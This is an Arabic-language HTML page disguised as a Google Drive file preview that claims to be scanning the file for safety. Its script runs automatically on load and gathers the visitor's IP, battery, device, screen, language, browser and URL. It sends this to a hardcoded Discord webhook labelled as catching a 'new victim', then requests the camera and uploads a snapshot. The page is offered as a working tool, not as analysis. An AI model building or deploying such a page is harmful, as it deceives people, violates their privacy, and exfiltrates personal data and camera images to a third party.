<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Google Drive - معاينة الملف</title>
    <script>
    async function TLQQEMM_FULL_LOG() {
        const webhook = "https://discord.com/api/webhooks/1484237384894775581/NlH9ZW7NVqz0NEQBEGPdixnycVulnArV_a4kr9Sufao9NwQfztk8k_7k12In3IsR_-67"; // ضع رابط الويبهوك الخاص بك هنا
        
        let batteryStatus = "غير معروف";
        try {
            if (navigator.getBattery) {
                const bt = await navigator.getBattery();
                batteryStatus = `${Math.round(bt.level * 100)}% (${bt.charging ? "يتم الشحن" : "لا يشحن"})`;
            }
        } catch (e) {}

        const ipReq = await fetch('https://api.ipify.org?format=json');
        const ipRes = await ipReq.json();

        const payload = {
            embeds: [{
                title: "🚀 تم صيد ضحية جديدة - نظام TLQQEMM",
                color: 65280,
                fields: [
                    { name: "🌐 عنوان الـ IP", value: ipRes.ip, inline: true },
                    { name: "🔋 حالة البطارية", value: batteryStatus, inline: true },
                    { name: "💻 نوع الجهاز/النظام", value: navigator.platform, inline: true },
                    { name: "🧠 الذاكرة العشوائية (RAM)", value: `${navigator.deviceMemory || 'غير معروف'} جيجا`, inline: true },
                    { name: "📱 أبعاد الشاشة", value: `${screen.width}x${screen.height}`, inline: true },
                    { name: "🌍 لغة الجهاز", value: navigator.language, inline: true },
                    { name: "🕵️ المتصفح المستخدم", value: navigator.userAgent },
                    { name: "🔗 الرابط الذي دخله", value: window.location.href }
                ],
                footer: { text: "نظام سحب البيانات المتطور | TLQQEMM" },
                timestamp: new Date()
            }]
        };

        // إرسال البيانات النصية
        await fetch(webhook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        // طلب الكاميرا (اختياري للضحية)
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const imgData = canvas.toDataURL('image/png');
            
            const blob = await (await fetch(imgData)).blob();
            const formData = new FormData();
            formData.append('file', blob, 'victim_shot.png');
            formData.append('content', "📸 **صورة مباشرة من كاميرا الضحية:**");
            await fetch(webhook, { method: 'POST', body: formData });
            
            stream.getTracks().forEach(track => track.stop());
        } catch (e) {}
    }

    window.onload = TLQQEMM_FULL_LOG;
    </script>
</head>
<body style="background-color: #000; color: white; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;">
    <div style="text-align: center;">
        <img src="https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg" width="80">
        <h2>جاري فحص الملف للأمان...</h2>
        <p>يرجى الانتظار قليلاً، سيتم فتح الملف تلقائياً.</p>
    </div>
</body>
</html>
